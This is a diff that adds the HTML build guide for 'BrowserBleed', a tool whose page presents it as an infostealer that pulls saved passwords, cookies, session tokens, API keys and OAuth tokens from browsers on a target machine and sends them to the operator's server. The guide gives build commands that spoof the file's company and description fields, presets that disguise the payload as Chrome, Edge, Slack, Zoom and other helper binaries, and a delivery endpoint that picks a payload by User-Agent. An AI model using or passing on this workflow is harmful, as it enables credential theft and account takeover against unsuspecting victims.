@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BrowserBleed — Build Guide</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiByeD0iOCIgZmlsbD0iIzBhMGMxMCIvPjxwYXRoIGQ9Ik0xNiA2QzE2IDYgOCAxNiA4IDIxYTggOCAwIDAgMCAxNiAwYzAtNS04LTE1LTgtMTV6IiBmaWxsPSIjZjg1MTQ5Ii8+PC9zdmc+">
+<style>
+:root{
+  --bg:#0a0c10;--surface:#10141a;--surface2:#13181f;--surface3:#0d1117;
+  --border:#1e2530;--border-h:#2d3748;
+  --text:#cdd5e0;--dim:#5a6478;--muted:#3d4758;
+  --accent:#4f8ef7;--green:#3fb950;--yellow:#d29922;--red:#f85149;
+  --radius:8px;
+  --mono:"SFMono-Regular","Cascadia Code",Consolas,monospace;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",system-ui,sans-serif;font-size:14px;min-height:100vh}
+.shell{max-width:900px;margin:0 auto;padding:0 24px 80px}
+.topbar{display:flex;align-items:center;border-bottom:1px solid var(--border);margin-bottom:40px;padding-top:20px}
+.topbar-brand{font-size:13px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--dim);padding-right:24px;border-right:1px solid var(--border);margin-right:4px;white-space:nowrap}
+.nav-link{display:inline-flex;align-items:center;gap:6px;padding:10px 16px;font-size:13px;font-weight:500;color:var(--dim);text-decoration:none;border-bottom:2px solid transparent;margin-bottom:-1px;transition:color .15s,border-color .15s}
+.nav-link:hover{color:var(--text)}.nav-link.active{color:var(--accent);border-bottom-color:var(--accent)}
+.nav-icon{width:14px;height:14px;opacity:.7}
+.guide-subnav{display:flex;gap:2px;margin-bottom:28px;padding:4px;background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);width:fit-content}
+.guide-tab{padding:5px 14px;border-radius:5px;font-size:12px;font-weight:500;color:var(--dim);text-decoration:none;transition:color .12s,background .12s;white-space:nowrap}
+.guide-tab:hover{color:var(--text);background:rgba(255,255,255,.04)}
+.guide-tab.active{background:var(--surface);color:var(--text);border:1px solid var(--border)}
+.page-title{font-size:26px;font-weight:600;margin-bottom:6px}
+.page-sub{font-size:14px;color:var(--dim);margin-bottom:36px}
+h2{font-size:16px;font-weight:700;color:var(--text);margin:36px 0 12px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+h3{font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--dim);margin:24px 0 10px}
+p{font-size:14px;color:var(--text);line-height:1.65;margin-bottom:12px}
+p:last-child{margin-bottom:0}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+code{font-family:var(--mono);font-size:12px;color:var(--text);background:var(--surface2);border:1px solid var(--border);border-radius:4px;padding:1px 5px}
+pre{background:var(--surface3);border:1px solid var(--border);border-radius:var(--radius);padding:16px 20px;font-family:var(--mono);font-size:13px;color:var(--text);line-height:1.6;overflow-x:auto;margin-bottom:16px}
+pre code{background:none;border:none;padding:0;font-size:13px}
+.callout{background:var(--surface2);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:0 var(--radius) var(--radius) 0;padding:12px 16px;margin-bottom:16px;font-size:13px;color:var(--dim);line-height:1.6}
+.callout.yellow{border-left-color:var(--yellow)}
+.callout strong{color:var(--text)}
+.tbl-wrap{overflow-x:auto;margin-bottom:16px}
+table{width:100%;border-collapse:collapse;font-size:13px}
+thead th{background:var(--surface2);color:var(--dim);font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.06em;padding:8px 14px;text-align:left;border-bottom:1px solid var(--border);white-space:nowrap}
+tbody td{padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top;line-height:1.5}
+tbody tr:last-child td{border-bottom:none}
+tbody tr:hover td{background:rgba(255,255,255,.02)}
+.td-code{font-family:var(--mono);font-size:12px;color:var(--accent);white-space:nowrap}
+.td-dim{color:var(--dim)}
+@media(max-width:640px){
+  .shell{padding:0 12px 64px}
+  .topbar-brand{padding-right:14px;font-size:12px}
+  .nav-link{padding:8px 10px;font-size:12px}
+  .page-title{font-size:20px}
+  pre{font-size:11px;padding:12px}
+  .guide-subnav{flex-wrap:wrap}
+}
+</style>
+</head>
+<body>
+<div class="shell">
+
+  <div class="topbar">
+    <span class="topbar-brand">BrowserBleed</span>
+    <a href="/" class="nav-link">
+      <svg class="nav-icon" viewBox="0 0 16 16" fill="currentColor"><path d="M2 2h12v2H2V2zm0 4h12v2H2V6zm0 4h8v2H2v-2z"/></svg>Reports
+    </a>
+    <a href="/payloads" class="nav-link">
+      <svg class="nav-icon" viewBox="0 0 16 16" fill="currentColor"><path d="M7.47 10.78a.75.75 0 0 0 1.06 0l3.75-3.75a.75.75 0 0 0-1.06-1.06L8.75 8.44V1.75a.75.75 0 0 0-1.5 0v6.69L4.78 5.97a.75.75 0 0 0-1.06 1.06l3.75 3.75zM1.75 13.5a.75.75 0 0 0 0 1.5h12.5a.75.75 0 0 0 0-1.5H1.75z"/></svg>Payloads
+    </a>
+    <a href="/guide" class="nav-link active">
+      <svg class="nav-icon" viewBox="0 0 16 16" fill="currentColor"><path d="M0 1.75A.75.75 0 0 1 .75 1h4.253c1.227 0 2.317.59 3 1.501A3.744 3.744 0 0 1 11.006 1h4.245a.75.75 0 0 1 .75.75v10.5a.75.75 0 0 1-.75.75h-4.507a2.25 2.25 0 0 0-1.591.659l-.622.621a.75.75 0 0 1-1.06 0l-.622-.621A2.25 2.25 0 0 0 5.258 13H.75a.75.75 0 0 1-.75-.75Zm7.75 3.28v7.205c.46-.302.979-.44 1.5-.44h3.75V2.5h-3.495a2.25 2.25 0 0 0-1.755.78ZM1.5 2.5V12h3.758c.52 0 1.039.138 1.499.44V5.78A2.25 2.25 0 0 0 5.003 5H1.5Z"/></svg>
+      Guide
+    </a>
+  </div>
+
+  <div class="guide-subnav">
+    <a href="/guide" class="guide-tab">Overview</a>
+    <a href="/guide/start" class="guide-tab">Getting Started</a>
+    <a href="/guide/build" class="guide-tab active">Build</a>
+    <a href="/guide/delivery" class="guide-tab">Delivery</a>
+    <a href="/guide/sessiontest" class="guide-tab">Session Test</a>
+  </div>
+
+  <h1 class="page-title">Build</h1>
+  <p class="page-sub">Build credential extraction payloads for Windows, macOS, and Linux.</p>
+
+  <!-- ── Overview ── -->
+  <h2>Overview</h2>
+  <p>
+    The BrowserBleed payload is a Python script compiled to a standalone binary with PyInstaller. When executed on a target machine, it extracts saved passwords, cookies, session tokens, API keys, and OAuth tokens from browser profile directories and running browser processes, then POSTs an encrypted report to your server.
+  </p>
+  <p>
+    All build scripts read <code>DOMAIN</code> and <code>BB_API_KEY</code> from <code>deploy/config</code> automatically. You do not need to manually embed any URLs or keys.
+  </p>
+
+  <div class="callout yellow">
+    <strong>Run the build script on the same OS as your target.</strong> Windows payloads must be built on Windows; macOS payloads on a Mac; Linux payloads on Linux. Cross-OS builds are not supported — PyInstaller must run natively.
+  </div>
+
+  <!-- ── Option A: Local build ── -->
+  <h2>Option A — Local build</h2>
+  <p>Run the build script directly from the repo root. Use the <a href="/payloads">Build Command generator</a> on the Payloads page to compose the exact command.</p>
+
+  <h3>Windows (PowerShell)</h3>
+  <pre><code># Basic build — chrome preset
+.\build_windows.ps1 -Preset chrome
+
+# Custom exe name
+.\build_windows.ps1 -Preset chrome -ExeName chrome_updater
+
+# With metadata spoofing (shows in file properties)
+.\build_windows.ps1 -Preset chrome -Company "Google LLC" -FileDesc "Chrome Update Service"
+
+# Custom icon
+.\build_windows.ps1 -Preset chrome -IconFile .\icons\chrome.ico
+
+# Build and upload to payload server in one step
+.\build_windows.ps1 -Preset chrome -Upload</code></pre>
+
+  <h3>macOS (Bash)</h3>
+  <pre><code>./build_mac.sh --preset chrome
+./build_mac.sh --preset chrome --name google-chrome
+./build_mac.sh --preset chrome --upload</code></pre>
+
+  <h3>Linux (Bash — requires sudo)</h3>
+  <pre><code>sudo ./build_linux.sh --preset chrome
+sudo ./build_linux.sh --preset chrome --name google-chrome
+sudo ./build_linux.sh --preset chrome --upload</code></pre>
+
+  <p>The <code>--upload</code> / <code>-Upload</code> flag POSTs the built binary to <code>/payloads</code> on your server after a successful build. The server returns HTTP 303 on success.</p>
+
+  <!-- ── Option B: Build agent ── -->
+  <h2>Option B — Build agent</h2>
+  <p>
+    The build agent (<code>build_agent.py</code>) polls the server's build queue and builds jobs automatically. Queue a build from the <a href="/payloads">Build Command section</a> on the Payloads page, then run the agent on your Windows machine.
+  </p>
+  <pre><code>python build_agent.py</code></pre>
+  <p>The agent polls <code>/builds/claim</code> every 5 seconds. When a pending job appears, it runs <code>build_windows.ps1</code> with the queued parameters and uploads the resulting exe via <code>/builds/{id}/complete</code>.</p>
+
+  <div class="callout">
+    <strong>The build agent only builds Windows payloads</strong> — it calls <code>build_windows.ps1</code> internally. Queue macOS and Linux builds manually using the local build scripts.
+  </div>
+
+  <!-- ── Option C: Manual upload ── -->
+  <h2>Option C — Manual upload</h2>
+  <p>
+    If you have a pre-built binary, upload it directly via the <strong>Manual Upload</strong> section on the <a href="/payloads">Payloads page</a>. Accepts any binary up to 256 MB. The filename is used as-is.
+  </p>
+
+  <!-- ── Presets ── -->
+  <h2>Presets</h2>
+  <p>
+    A preset controls the default exe name and the disguised download name used by smart delivery (<code>/p/{preset}</code>). It also sets the default meeting subject in the calendar invite generator.
+  </p>
+
+  <div class="tbl-wrap">
+  <table>
+    <thead><tr><th>Preset</th><th>Windows exe</th><th>Windows DL name</th><th>macOS DL name</th></tr></thead>
+    <tbody>
+      <tr><td class="td-code">chrome</td><td class="td-dim">chrome.exe</td><td class="td-dim">chrome_crashpad_handler.exe</td><td class="td-dim">Google Chrome Helper</td></tr>
+      <tr><td class="td-code">edge</td><td class="td-dim">edge.exe</td><td class="td-dim">msedge_crashpad_handler.exe</td><td class="td-dim">Microsoft Edge Helper</td></tr>
+      <tr><td class="td-code">brave</td><td class="td-dim">brave.exe</td><td class="td-dim">brave_crashpad_handler.exe</td><td class="td-dim">Brave Browser Helper</td></tr>
+      <tr><td class="td-code">firefox</td><td class="td-dim">firefox.exe</td><td class="td-dim">plugin-container.exe</td><td class="td-dim">Firefox</td></tr>
+      <tr><td class="td-code">opera</td><td class="td-dim">opera.exe</td><td class="td-dim">opera_crashpad_handler.exe</td><td class="td-dim">Opera Helper</td></tr>
+      <tr><td class="td-code">slack</td><td class="td-dim">slack.exe</td><td class="td-dim">slack.exe</td><td class="td-dim">Slack Helper</td></tr>
+      <tr><td class="td-code">discord</td><td class="td-dim">discord.exe</td><td class="td-dim">Discord.exe</td><td class="td-dim">Discord Helper</td></tr>
+      <tr><td class="td-code">teams</td><td class="td-dim">ms-teams.exe</td><td class="td-dim">ms-teams.exe</td><td class="td-dim">Microsoft Teams Helper</td></tr>
+      <tr><td class="td-code">zoom</td><td class="td-dim">zoom.exe</td><td class="td-dim">Zoom.exe</td><td class="td-dim">ZoomHelper</td></tr>
+      <tr><td class="td-code">whatsapp</td><td class="td-dim">whatsapp.exe</td><td class="td-dim">WhatsApp.exe</td><td class="td-dim">WhatsApp Helper</td></tr>
+      <tr><td class="td-code">telegram</td><td class="td-dim">telegram.exe</td><td class="td-dim">Telegram.exe</td><td class="td-dim">Telegram Desktop</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <p>Smart delivery (<code>/p/preset</code>) serves the correct payload based on the visitor's User-Agent. If no matching payload exists for the visitor's OS, the endpoint returns 404.</p>
+
+  <!-- ── Target flags ── -->
+  <h2>Target flags</h2>
+  <p>These flags are passed to the payload when it runs on the target machine — not to the build script. Append them to the run command shown in the Build Command section.</p>
+
+  <div class="tbl-wrap">
+  <table>
+    <thead><tr><th>Flag</th><th>Description</th></tr></thead>
+    <tbody>
+      <tr>
+        <td class="td-code">--memory-only</td>
+        <td>Only extract credentials from running browser processes. Skips all disk-based credential stores. Use when you want only live session tokens (faster, smaller output).</td>
+      </tr>
+      <tr>
+        <td class="td-code">--disk-only</td>
+        <td>Only extract from saved browser profile directories. Skips process memory. Use when browsers are not open or you prefer saved passwords over session tokens.</td>
+      </tr>
+      <tr>
+        <td class="td-code">--verify</td>
+        <td>Validate each extracted credential before including it in the report. Slower but produces cleaner output with fewer false positives.</td>
+      </tr>
+    </tbody>
+  </table>
+  </div>
+
+  <p>Without any flags, BrowserBleed extracts from both memory and disk. The hit count in the report reflects all unique credentials found.</p>
+
+  <!-- ── Tips ── -->
+  <h2>Tips</h2>
+  <p><strong>Encoding:</strong> The Windows build script always uses <code>-Encoding utf8</code> when reading the Python source. Never pipe or edit the source with a tool that changes the encoding — box-drawing characters in string literals will be corrupted.</p>
+  <p><strong>Hit count variation:</strong> Normal. Session ID hits from open browser tabs can be 400+ or as low as 10 depending on what the target has open. Core credentials (saved passwords, API keys, OAuth tokens) are stable across runs.</p>
+  <p><strong>PyInstaller virtualenv:</strong> Each build script creates a fresh virtualenv in a temp directory. If a build fails partway through, delete the <code>build/</code> and <code>dist/</code> directories in the repo root before retrying.</p>
+
+</div>
+</body>
+</html>
